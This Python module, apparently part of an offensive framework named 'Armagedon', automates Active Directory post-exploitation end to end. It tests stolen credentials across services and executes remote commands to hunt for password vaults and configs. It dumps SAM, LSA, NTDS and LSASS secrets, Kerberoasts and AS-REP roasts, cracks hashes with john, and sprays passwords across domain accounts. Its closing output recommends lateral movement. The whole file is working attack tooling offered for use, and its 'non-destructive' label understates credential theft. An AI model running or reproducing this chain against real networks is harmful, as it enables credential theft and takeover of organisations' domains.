"""
Armagedon AD Post-Exploitation Enumeration Module

Full automated AD post-exploitation loop: credential testing, host enumeration,
credential dumping, LDAP enumeration, Kerberoasting, hash cracking, and password
spraying. Mirrors the standalone ad_post_enum.sh workflow.

Tools used: nxc (NetExec), impacket (GetUserSPNs/GetNPUsers), john, nmap, xfreerdp.
All operations are non-destructive READ in CHECK mode.
"""

import subprocess
import shutil
import os
import re
import json
import time
import tempfile
import logging
from datetime import datetime
from pathlib import Path

log = logging.getLogger("armagedon.modules.post.ad_post_enum")

CVE = "N/A"
DESCRIPTION = "AD Post-Exploitation Enumeration — Full automated AD post-exploitation loop"
PLATFORM = "Windows"
RANK = "normal"
AUTHOR = "Armagedon"
DISCLOSURE = "N/A"

SAFE_MODE = int(os.environ.get("ARMAGEDON_SAFE_MODE", "1"))
SAFETY_LEVEL = "LOW"  # read-only enumeration + credential extraction

OPTIONS = {
    "RHOSTS": "",
    "RPORT": 445,
    "USERNAME": "",
    "PASSWORD": "",
    "DOMAIN": "",
    "OUTPUT_DIR": "",
    "MODE": "FULL",
    "STEPS": "TEST,ENUM,DUMP,LDAP,KERB,CRACK,SPRAY",
    "WORDLIST": "/usr/share/wordlists/rockyou.txt",
    "VERBOSE": False,
}

REQUIRED = {"RHOSTS": True, "USERNAME": True, "PASSWORD": True, "DOMAIN": True}
DESCRIPTIONS = {
    "RHOSTS": "Target DC or domain-joined host IP",
    "RPORT": "Primary service port (default 445)",
    "USERNAME": "Username for authentication (e.g. visitor, admin@corp.local)",
    "PASSWORD": "Password for authentication",
    "DOMAIN": "Active Directory domain (e.g. COOCTUS.CORP)",
    "OUTPUT_DIR": "Output directory (auto-generated if empty)",
    "MODE": "FULL | ENUM | DUMP | KERB | CRACK | SPRAY (which stages to run)",
    "STEPS": "Comma-separated step list for FULL mode",
    "WORDLIST": "John wordlist for hash cracking",
    "VERBOSE": "Print every nxc/impacket command output",
}


# ─── Tool helpers ──────────────────────────────────────────────────────────────

def _find_nxc():
    return shutil.which("nxc")


def _find_john():
    return shutil.which("john")


def _find_impacket(tool):
    """Find impacket tool (impacket-GetUserSPNs or GetUserSPNs.py)."""
    path = shutil.which(f"impacket-{tool}")
    if path:
        return path
    return shutil.which(f"{tool}.py")


def _run_cmd(cmd, timeout=120, capture=True):
    """Run a shell command, return (stdout, stderr, returncode)."""
    try:
        r = subprocess.run(
            cmd, shell=isinstance(cmd, str),
            capture_output=capture, text=True, timeout=timeout,
        )
        return r.stdout or "", r.stderr or "", r.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", -1
    except Exception as e:
        return "", str(e), -1


def _nxc_run(service, target, user, passwd, extra_args="", timeout=60):
    """Run nxc command and return output."""
    nxc = _find_nxc()
    if not nxc:
        return ""
    # Build user formats: bare, DOMAIN\user, user@domain
    bare = user
    if "\\" in user:
        bare = user.split("\\", 1)[1]
    if "@" in user:
        bare = user.split("@")[0]

    domain = OPTIONS.get("DOMAIN", "")
    formats = [bare]
    if domain:
        formats.append(f"{domain}\\{bare}")
        formats.append(f"{bare}@{domain.lower()}")

    for fmt in formats:
        cmd = f'{nxc} {service} {target} -u "{fmt}" -p "{passwd}" {extra_args}'
        stdout, stderr, rc = _run_cmd(cmd, timeout=timeout)
        output = stdout + stderr
        if "PWND!" in output or "[+]" in output:
            return output, fmt
    return "", ""


def _exec_smb(target, user, passwd, cmd_str, timeout=60):
    """Execute a command on target via nxc smb -x."""
    nxc = _find_nxc()
    if not nxc:
        return ""
    full = f'{nxc} smb {target} -u "{user}" -p "{passwd}" -x "{cmd_str}"'
    stdout, _, _ = _run_cmd(full, timeout=timeout)
    return stdout


# ─── Save helpers ──────────────────────────────────────────────────────────────

def _save_cred(output_dir, domain, user, passwd, source="initial"):
    """Append credential to all_creds.txt."""
    cred_file = os.path.join(output_dir, "all_creds.txt")
    with open(cred_file, "a") as f:
        f.write(f"{domain}\\{user}:{passwd} (Source: {source})\n")
    print(f"  [+] Credential saved: {domain}\\{user}:{passwd}")


def _save_hash(output_dir, hash_line, source="unknown"):
    """Append hash line to all_hashes.txt."""
    hash_file = os.path.join(output_dir, "all_hashes.txt")
    with open(hash_file, "a") as f:
        f.write(hash_line + "\n")
    print(f"  [+] Hash saved ({source})")


# ─── Stage: Test credentials ──────────────────────────────────────────────────

def _test_credentials(target, user, passwd, domain, output_dir):
    """Test credentials on SMB, WinRM, RDP, LDAP. Returns dict of results."""
    print(f"\n{'='*60}")
    print("  STAGE 1: Testing Credentials on All Services")
    print(f"{'='*60}")

    _save_cred(output_dir, domain, user, passwd, "initial")

    services = ["smb", "winrm", "rdp", "ldap"]
    results = {}
    any_pwnd = False
    rdp_pwnd = False
    working_user = user

    for svc in services:
        output, fmt_used = _nxc_run(svc, target, user, passwd)
        if output:
            if "PWND!" in output:
                print(f"  [+] {svc.upper()} PWND!  (user format: {fmt_used})")
                results[svc] = {"status": "pwnd", "user_format": fmt_used}
                any_pwnd = True
                if svc == "rdp":
                    rdp_pwnd = True
                if fmt_used != user:
                    _save_cred(output_dir, domain, fmt_used, passwd, "auto-format-fix")
                    working_user = fmt_used
            elif "[+]" in output:
                print(f"  [+] {svc.upper()} accessible (user format: {fmt_used})")
                results[svc] = {"status": "accessible", "user_format": fmt_used}
                any_pwnd = True
                if svc == "rdp":
                    rdp_pwnd = True
                if fmt_used != user:
                    _save_cred(output_dir, domain, fmt_used, passwd, "auto-format-fix")
                    working_user = fmt_used
            else:
                print(f"  [-] {svc.upper()} failed")
                results[svc] = {"status": "failed"}
        else:
            print(f"  [-] {svc.upper()} failed (no response)")
            results[svc] = {"status": "failed"}

    # RDP screenshot
    if rdp_pwnd:
        _rdp_screenshot(target, working_user, passwd, output_dir)

    return {"any_pwnd": any_pwnd, "rdp_pwnd": rdp_pwnd,
            "working_user": working_user, "services": results}


def _rdp_screenshot(target, user, passwd, output_dir):
    """Take RDP screenshot with NLA fallback."""
    print("  [*] Taking RDP screenshot...")
    nxc = _find_nxc()
    ss_path = os.path.join(output_dir, "rdp_screenshot.png")
    if nxc:
        cmd = f'{nxc} rdp {target} -u "{user}" -p "{passwd}" --nla-screenshot'
        stdout, _, _ = _run_cmd(cmd, timeout=30)
        if stdout:
            with open(ss_path, "w") as f:
                f.write(stdout)
            print(f"  [+] RDP screenshot saved to {ss_path}")
        else:
            print("  [!] RDP screenshot failed")
    else:
        # Fallback: nmap RDP info
        nmap = shutil.which("nmap")
        if nmap:
            info_path = os.path.join(output_dir, "rdp_info.txt")
            _run_cmd(f'{nmap} -p 3389 --script rdp-vuln-ms12-020,rdp-enum-encryption {target}',
                     timeout=30)
            print(f"  [!] RDP info saved to {info_path}")


# ─── Stage: Full enumeration ──────────────────────────────────────────────────

def _full_enum(target, user, passwd, domain, output_dir):
    """Full host enumeration via SMB exec commands."""
    print(f"\n{'='*60}")
    print("  STAGE 2: Full Host Enumeration")
    print(f"{'='*60}")

    enum_dir = os.path.join(output_dir, f"compromised_{user}")
    os.makedirs(enum_dir, exist_ok=True)

    commands = {
        "systeminfo.txt": "systeminfo",
        "ipconfig.txt": "ipconfig /all",
        "hostname.txt": "hostname",
        "local_users.txt": "net user",
        "local_admins.txt": "net localgroup administrators",
        "domain_users.txt": "net user /domain",
        "domain_admins.txt": 'net group "Domain Admins" /domain',
        "enterprise_admins.txt": 'net group "Enterprise Admins" /domain',
        "tasklist.txt": "tasklist /svc",
        "netstat.txt": "netstat -ano",
        "shares.txt": "net share",
        "password_policy.txt": "net accounts",
        "saved_creds.txt": "cmdkey /list",
        "autologon.txt": 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon',
        "txt_files.txt": 'where /R C:\\Users *.txt',
        "keepass_files.txt": 'where /R C:\\Users *.kdbx',
        "config_files.txt": 'where /R C:\\Users *.config',
    }

    count = 0
    for fname, cmd_str in commands.items():
        print(f"  [*] {fname.replace('.txt', '').replace('_', ' ').title()}...")
        output = _exec_smb(target, user, passwd, cmd_str, timeout=45)
        if output:
            with open(os.path.join(enum_dir, fname), "w") as f:
                f.write(output)
            count += 1

    print(f"  [+] Enumeration complete — {count} files in {enum_dir}")
    return {"output_dir": enum_dir, "files": count}


# ─── Stage: Credential dumping ────────────────────────────────────────────────

def _dump_creds(target, user, passwd, domain, output_dir):
    """Dump SAM, LSA, NTDS, LSASS via nxc."""
    print(f"\n{'='*60}")
    print("  STAGE 3: Credential Dumping")
    print(f"{'='*60}")

    dump_dir = os.path.join(output_dir, f"dumps_{user}")
    os.makedirs(dump_dir, exist_ok=True)

    nxc = _find_nxc()
    if not nxc:
        print("  [-] nxc not found — skipping credential dump")
        return {"sam": [], "lsa": [], "ntds": [], "lsass": []}

    creds = {"sam": [], "lsa": [], "ntds": [], "lsass": []}

    # SAM
    print("  [*] Dumping SAM...")
    sam_file = os.path.join(dump_dir, "sam.txt")
    cmd = f'{nxc} smb {target} -u "{user}" -p "{passwd}" --sam'
    stdout, _, _ = _run_cmd(cmd, timeout=90)
    if stdout:
        with open(sam_file, "w") as f:
            f.write(stdout)
        # Extract NTLM hashes: SID:RID:LM:NTLM:::
        for line in stdout.splitlines():
            m = re.search(r":(\d{5}):[a-f0-9]{32}:", line)
            if m:
                creds["sam"].append(line.strip())
                _save_hash(output_dir, line.strip(), "SAM")
        print(f"  [+] SAM: {len(creds['sam'])} hashes")
    else:
        print("  [-] SAM dump failed")

    # LSA
    print("  [*] Dumping LSA...")
    cmd = f'{nxc} smb {target} -u "{user}" -p "{passwd}" --lsa'
    stdout, _, _ = _run_cmd(cmd, timeout=90)
    if stdout:
        with open(os.path.join(dump_dir, "lsa.txt"), "w") as f:
            f.write(stdout)
        print("  [+] LSA dumped successfully")

    # NTDS
    print("  [*] Attempting NTDS dump...")
    ntds_file = os.path.join(dump_dir, "ntds.txt")
    cmd = f'{nxc} smb {target} -u "{user}" -p "{passwd}" --ntds'
    stdout, _, _ = _run_cmd(cmd, timeout=180)
    if stdout:
        with open(ntds_file, "w") as f:
            f.write(stdout)
        for line in stdout.splitlines():
            m = re.search(r":(\d{5}):[a-f0-9]{32}:", line)
            if m:
                creds["ntds"].append(line.strip())
                _save_hash(output_dir, line.strip(), "NTDS")
        print(f"  [+] NTDS: {len(creds['ntds'])} hashes")
    else:
        print("  [-] NTDS dump failed (may not be a DC)")

    # LSASS
    print("  [*] Attempting LSASS dump...")
    cmd = f'{nxc} smb {target} -u "{user}" -p "{passwd}" -M lsassy'
    stdout, _, _ = _run_cmd(cmd, timeout=60)
    if stdout:
        with open(os.path.join(dump_dir, "lsass.txt"), "w") as f:
            f.write(stdout)
        print("  [+] LSASS dumped successfully")

    total = sum(len(v) for v in creds.values())
    print(f"  [+] Total credentials extracted: {total}")
    return creds


# ─── Stage: LDAP enumeration ──────────────────────────────────────────────────

def _ldap_enum(target, user, passwd, domain, output_dir):
    """LDAP enumeration: LAPS, GMSA, delegation, kerberoastable, AS-REP."""
    print(f"\n{'='*60}")
    print("  STAGE 4: LDAP Enumeration")
    print(f"{'='*60}")

    ldap_dir = os.path.join(output_dir, f"ldap_{user}")
    os.makedirs(ldap_dir, exist_ok=True)

    nxc = _find_nxc()
    if not nxc:
        print("  [-] nxc not found — skipping LDAP enumeration")
        return {}

    checks = {
        "laps.txt": "-M laps",
        "gmsa.txt": "-M get-gmsa",
        "delegation.txt": "-M find-delegation",
        "kerberoast.txt": "-M kerberoast",
        "asrep.txt": "-M asreproast",
    }

    results = {}
    for fname, module_arg in checks.items():
        label = fname.replace(".txt", "").replace("_", " ").title()
        print(f"  [*] Checking {label}...")
        cmd = f'{nxc} ldap {target} -u "{user}" -p "{passwd}" {module_arg}'
        stdout, _, _ = _run_cmd(cmd, timeout=60)
        if stdout:
            with open(os.path.join(ldap_dir, fname), "w") as f:
                f.write(stdout)
            results[fname.replace(".txt", "")] = stdout
            print(f"  [+] {label} complete")
        else:
            print(f"  [-] {label} returned no output")

    print(f"  [+] LDAP enumeration complete — results in {ldap_dir}")
    return results


# ─── Stage: Kerberoasting ─────────────────────────────────────────────────────

def _kerberoast(target, user, passwd, domain, output_dir):
    """Kerberoast SPN accounts via GetUserSPNs."""
    print(f"\n{'='*60}")
    print("  STAGE 5: Kerberoasting")
    print(f"{'='*60}")

    tool = _find_impacket("GetUserSPNs")
    if not tool:
        print("  [-] impacket-GetUserSPNs not found — skipping")
        return ""

    timestamp = datetime.now().strftime("%H%M%S")
    outfile = os.path.join(output_dir, f"kerberoast_{timestamp}.txt")

    auth = f"{domain}/{user}:{passwd}"
    cmd = f'{tool} -dc-ip {target} {auth} -request -outputfile {outfile}'
    stdout, stderr, rc = _run_cmd(cmd, timeout=120)

    if os.path.exists(outfile) and os.path.getsize(outfile) > 0:
        print(f"  [+] Kerberoast hashes saved to {outfile}")
        return outfile
    else:
        print("  [-] Kerberoast failed — no SPNs or authentication error")
        if stdout:
            print(f"      {stdout[:200]}")
        return ""


# ─── Stage: AS-REP Roasting ───────────────────────────────────────────────────

def _asreproast(target, user, passwd, domain, output_dir):
    """AS-REP roast accounts without pre-auth required."""
    print(f"\n{'='*60}")
    print("  STAGE 5b: AS-REP Roasting")
    print(f"{'='*60}")

    tool = _find_impacket("GetNPUsers")
    if not tool:
        print("  [-] impacket-GetNPUsers not found — skipping")
        return ""

    timestamp = datetime.now().strftime("%H%M%S")
    outfile = os.path.join(output_dir, f"asrep_{timestamp}.txt")

    auth = f"{domain}/{user}:{passwd}"
    cmd = f'{tool} {domain}/ -usersfile <(echo {user}) -dc-ip {target} -format hashcat -outputfile {outfile}'
    stdout, stderr, rc = _run_cmd(cmd, timeout=60)

    if os.path.exists(outfile) and os.path.getsize(outfile) > 0:
        print(f"  [+] AS-REP hashes saved to {outfile}")
        return outfile
    else:
        print("  [-] AS-REP roast failed or no roastable accounts")
        return ""


# ─── Stage: Crack hashes ──────────────────────────────────────────────────────

def _crack_hashes(output_dir, wordlist):
    """Crack NTLM and Kerberoast hashes with john."""
    print(f"\n{'='*60}")
    print("  STAGE 6: Cracking Captured Hashes")
    print(f"{'='*60}")

    john = _find_john()
    if not john:
        print("  [-] john not found — skipping cracking")
        return {}

    cracked = {"ntlm": [], "kerb": []}

    # Crack NTLM hashes
    hash_file = os.path.join(output_dir, "all_hashes.txt")
    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        print("  [*] Cracking NTLM hashes...")
        _run_cmd(f'{john} --format=NT --wordlist={wordlist} {hash_file}', timeout=600)
        stdout, _, _ = _run_cmd(f'{john} --show --format=NT {hash_file}', timeout=30)
        if stdout:
            cracked_file = os.path.join(output_dir, "cracked_ntlm.txt")
            with open(cracked_file, "w") as f:
                f.write(stdout)
            for line in stdout.splitlines():
                if ":" in line:
                    cracked["ntlm"].append(line.strip())
            print(f"  [+] NTLM cracked: {len(cracked['ntlm'])} passwords")
    else:
        print("  [-] No NTLM hashes to crack")

    # Crack Kerberoast hashes
    for kerb_file in sorted(Path(output_dir).glob("kerberoast_*.txt")):
        if kerb_file.stat().st_size > 0:
            print(f"  [*] Cracking {kerb_file.name}...")
            _run_cmd(f'{john} --format=krb5tgs --wordlist={wordlist} {kerb_file}',
                     timeout=600)
            stdout, _, _ = _run_cmd(f'{john} --show --format=krb5tgs {kerb_file}',
                                    timeout=30)
            if stdout:
                for line in stdout.splitlines():
                    if ":" in line:
                        cracked["kerb"].append(line.strip())
                print(f"  [+] Kerberoast cracked: {len(cracked['kerb'])} passwords")

    total = len(cracked["ntlm"]) + len(cracked["kerb"])
    print(f"  [+] Total cracked: {total}")
    return cracked


# ─── Stage: Password spray ────────────────────────────────────────────────────

def _password_spray(target, user, passwd, domain, output_dir):
    """Password spray discovered passwords across domain users."""
    print(f"\n{'='*60}")
    print("  STAGE 7: Password Spraying")
    print(f"{'='*60}")

    nxc = _find_nxc()
    if not nxc:
        print("  [-] nxc not found — skipping spray")
        return []

    # Gather usernames from domain_users.txt or from previous enumeration
    users_file = os.path.join(output_dir, "domain_users.txt")
    if not os.path.exists(users_file) or os.path.getsize(users_file) == 0:
        # Try to extract from enum files
        all_users = set()
        for f in Path(output_dir).rglob("*.txt"):
            try:
                content = f.read_text(errors="ignore")
                # Match DOMAIN\username pattern
                found = re.findall(rf"{re.escape(domain)}\\\\([a-zA-Z0-9._-]+)", content)
                all_users.update(found)
            except Exception:
                pass
        if all_users:
            with open(users_file, "w") as f:
                f.write("\n".join(sorted(all_users)))
        else:
            print("  [-] No users to spray — run LDAP enumeration first")
            return []

    print(f"  [*] Spraying {passwd} across users from {users_file}...")
    cmd = f'{nxc} smb {target} -u {users_file} -p "{passwd}" --continue-on-success'
    stdout, _, _ = _run_cmd(cmd, timeout=300)

    spray_file = os.path.join(output_dir, "spray_results.txt")
    if stdout:
        with open(spray_file, "w") as f:
            f.write(stdout)

        # Parse successful logons
        valid = []
        for line in stdout.splitlines():
            if "PWND!" in line or ("[+]" in line and "STATUS_LOGON_FAILURE" not in line):
                valid.append(line.strip())
                print(f"  [+] Valid: {line.strip()[:80]}")

        print(f"  [+] Spray complete — {len(valid)} valid credentials found")
        return valid
    else:
        print("  [-] Spray returned no results")
        return []


# ─── Stage: Test cracked passwords ────────────────────────────────────────────

def _test_cracked(target, cracked, domain, output_dir):
    """Test cracked passwords on SMB, WinRM, RDP."""
    print(f"\n{'='*60}")
    print("  STAGE 8: Testing Cracked Passwords on Other Services")
    print(f"{'='*60}")

    tested = 0
    for entry in cracked:
        parts = entry.split(":")
        if len(parts) < 2:
            continue
        cr_user = parts[0]
        cr_pass = parts[1]
        if not cr_pass:
            continue

        print(f"  [*] Testing {domain}\\{cr_user}:{cr_pass}")
        _save_cred(output_dir, domain, cr_user, cr_pass, "cracked")

        for svc in ["smb", "winrm", "rdp"]:
            output, fmt = _nxc_run(svc, target, cr_user, cr_pass)
            if output and ("PWND!" in output or "[+]" in output):
                print(f"  [+] {svc.upper()} accessible with cracked creds")
                tested += 1

    print(f"  [+] Tested {tested} service access with cracked creds")
    return tested


# ─── Summary ───────────────────────────────────────────────────────────────────

def _print_summary(output_dir, domain):
    """Print final summary of all results."""
    print(f"\n{'='*60}")
    print("  SUMMARY")
    print(f"{'='*60}")

    creds_file = os.path.join(output_dir, "all_creds.txt")
    hashes_file = os.path.join(output_dir, "all_hashes.txt")

    print(f"  Output directory:  {output_dir}")
    print(f"  Credentials file: {creds_file}")
    print(f"  Hashes file:      {hashes_file}")

    if os.path.exists(creds_file):
        with open(creds_file) as f:
            creds = f.read().strip()
        if creds:
            print(f"\n  All captured credentials:")
            for line in creds.splitlines():
                print(f"    {line}")

    print(f"\n  Next steps:")
    print(f"    1. Check {output_dir} for dumped credentials")
    print(f"    2. Crack remaining hashes: john --format=NT --wordlist=rockyou.txt {hashes_file}")
    print(f"    3. Use cracked creds for lateral movement")
    print(f"    4. Run again with new credentials")


# ─── Module interface ─────────────────────────────────────────────────────────

def check(options=None, target=None, **kwargs):
    """Verify prerequisites."""
    opts = dict(options or {})
    if target:
        opts["RHOSTS"] = target

    missing = []
    if not _find_nxc():
        missing.append("nxc (NetExec)")
    if not _find_john():
        missing.append("john (John the Ripper)")
    if not _find_impacket("GetUserSPNs"):
        missing.append("impacket-GetUserSPNs")

    if missing:
        return False, f"Missing tools: {', '.join(missing)}"

    return True, f"DC: {opts.get('RHOSTS', 'not set')}, Tools: nxc, john, impacket"


def run(options=None, target=None, mode="CHECK", **kwargs):
    """Execute AD post-exploitation enumeration.

    Modes:
        CHECK  — verify tools and validate options
        EXPLOIT — run the full enumeration loop (non-destructive)
    """
    global OPTIONS
    opts = dict(options or {})
    if target:
        opts["RHOSTS"] = target
    OPTIONS.update(opts)

    rhosts = opts.get("RHOSTS", "")
    user = opts.get("USERNAME", "")
    passwd = opts.get("PASSWORD", "")
    domain = opts.get("DOMAIN", "")
    verbose = opts.get("VERBOSE", False)

    log.info(f"ad_post_enum run target={rhosts} mode={mode}")

    if not rhosts or not user or not passwd or not domain:
        return {"success": False, "error": "RHOSTS, USERNAME, PASSWORD, DOMAIN all required"}

    if mode.upper() == "CHECK":
        ok, msg = check(opts, target)
        return {"success": ok, "message": msg, "tools": msg}

    # Generate output directory
    output_dir = opts.get("OUTPUT_DIR", "")
    if not output_dir:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = os.path.join(os.getcwd(), f"ad_enum_{ts}")
    os.makedirs(output_dir, exist_ok=True)
    hash_file = os.path.join(output_dir, "all_hashes.txt")
    if not os.path.exists(hash_file):
        open(hash_file, "w").close()

    print(f"\n{'#'*60}")
    print(f"  Armagedon — AD Post-Exploitation Enumeration")
    print(f"  Target:  {rhosts}")
    print(f"  Domain:  {domain}")
    print(f"  User:    {domain}\\{user}")
    print(f"  Output:  {output_dir}")
    print(f"{'#'*60}")

    steps_str = opts.get("STEPS", "TEST,ENUM,DUMP,LDAP,KERB,CRACK,SPRAY")
    steps = [s.strip().upper() for s in steps_str.split(",")]

    result = {
        "success": True,
        "target": rhosts,
        "domain": domain,
        "output_dir": output_dir,
        "stages": {},
    }

    # Step 1: Test credentials
    if "TEST" in steps:
        svc_result = _test_credentials(rhosts, user, passwd, domain, output_dir)
        result["stages"]["test"] = svc_result
        if not svc_result["any_pwnd"]:
            print(f"\n  [-] Credentials don't work on any service — aborting")
            result["success"] = False
            _print_summary(output_dir, domain)
            return result
        working_user = svc_result["working_user"]
    else:
        working_user = user

    # Step 2: Full enumeration
    if "ENUM" in steps:
        enum_result = _full_enum(rhosts, working_user, passwd, domain, output_dir)
        result["stages"]["enum"] = enum_result

    # Step 3: Credential dump
    if "DUMP" in steps:
        creds = _dump_creds(rhosts, working_user, passwd, domain, output_dir)
        result["stages"]["dump"] = {
            "sam": len(creds.get("sam", [])),
            "lsa": len(creds.get("lsa", [])),
            "ntds": len(creds.get("ntds", [])),
            "lsass": len(creds.get("lsass", [])),
        }

    # Step 4: LDAP enumeration
    if "LDAP" in steps:
        ldap_result = _ldap_enum(rhosts, working_user, passwd, domain, output_dir)
        result["stages"]["ldap"] = {k: len(v) for k, v in ldap_result.items()}

    # Step 5: Kerberoast + AS-REP
    if "KERB" in steps:
        kerb_file = _kerberoast(rhosts, working_user, passwd, domain, output_dir)
        asrep_file = _asreproast(rhosts, working_user, passwd, domain, output_dir)
        result["stages"]["kerb"] = {
            "kerberoast": kerb_file or None,
            "asrep": asrep_file or None,
        }

    # Step 6: Crack hashes
    if "CRACK" in steps:
        wordlist = opts.get("WORDLIST", "/usr/share/wordlists/rockyou.txt")
        cracked = _crack_hashes(output_dir, wordlist)
        result["stages"]["crack"] = {
            "ntlm": len(cracked.get("ntlm", [])),
            "kerb": len(cracked.get("kerb", [])),
        }

    # Step 7: Password spray
    if "SPRAY" in steps:
        spray_result = _password_spray(rhosts, working_user, passwd, domain, output_dir)
        result["stages"]["spray"] = {"valid": len(spray_result)}

    # Step 8: Test cracked passwords
    cracked_file = os.path.join(output_dir, "cracked_ntlm.txt")
    if os.path.exists(cracked_file) and os.path.getsize(cracked_file) > 0:
        with open(cracked_file) as f:
            cracked_lines = [l.strip() for l in f if l.strip()]
        if cracked_lines:
            tested = _test_cracked(rhosts, cracked_lines, domain, output_dir)
            result["stages"]["test_cracked"] = {"tested": tested}

    _print_summary(output_dir, domain)

    result["success"] = True
    return result
